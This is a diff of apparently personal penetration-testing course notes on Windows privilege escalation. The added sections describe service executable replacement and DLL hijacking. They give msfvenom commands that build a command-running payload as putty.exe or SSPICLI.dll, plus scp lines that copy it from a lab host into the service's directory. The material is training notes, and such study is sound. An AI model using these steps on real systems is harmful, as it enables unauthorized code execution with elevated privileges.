@@ -64,7 +64,31 @@ DLL Hijacking
 
 
 
-SYNTAX
+
+
+
+
+
+EXE REPLACEMENT SYNTAX				IF YOU CAN WRITE TO DIRECTORY AND CAN RENAME THE EXECUTABLE
+	services (GUI)
+	look for evalutaed services from above
+	If no description
+		possible give away
+	properties
+		find at path to executable
+		test if you can run an executable in directory
+		try to rename the executable
+		IN LINUX
+			msfvenom -p windows/exec CMD='cmd.exe /C "[command you want to run]" > C:\Users\student\Desktop\[command ran].txt' -f exe > [must match the name of service in properties] putty.exe
+		IN WINDOWS
+			scp student@10.50.34.74:/home/student/putty.exe "C:\Program Files (x86)\putty\putty.exe"
+
+
+
+
+
+
+DLL HIJACKING SYNTAX				IF YOU CAN WRITE TO DIRECTORY BUT CANNONT RENAME THE EXECUTABLE
 	services (GUI)
 	look for evalutaed services from above
 	If no description
@@ -81,11 +105,9 @@ SYNTAX
 			look for a .dll to place a malicious .dll into
 		IN LINUX
 			msfvenom -p windows/exec CMD='cmd.exe /C "[command you want to run]" > C:\Users\student\Desktop\[command ran].txt' -f dll > SSPICLI.dll
-
-
-
-
-
+		
+		In WINDOWS
+			scp student@10.50.34.74:/home/student/SSPICLI.dll "C:\Program Files (x86)\putty\SSPICLI.DLL"
 
 
 
